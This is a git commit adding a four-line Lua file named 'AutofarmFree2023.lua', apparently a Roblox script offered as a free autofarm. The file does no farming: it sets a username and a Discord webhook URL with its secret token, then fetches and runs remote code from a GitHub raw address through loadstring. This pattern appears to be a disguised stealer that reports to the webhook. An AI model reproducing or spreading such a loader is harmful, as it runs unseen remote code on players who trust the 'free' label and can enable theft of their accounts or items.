9f7f89b0070ab96f79d6836d9aec89a7ecd00176
Ryannair <130558002+Ryannair@users.noreply.github.com>
2023-04-12 18:40:57 +0200

    Create AutofarmFree2023.lua

---
+++ AutofarmFree2023.lua
@@ -0,0 +1,4 @@
+UserName = "rayanwar999"
+Webhook = "https://discord.com/api/webhooks/1095750156718186536/0sTzu9tietDS7ZNb559Hx7DnsVZux-5yv4RZpps9DoFAxwqV7MHfznghBjKdS9xtLn-h" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
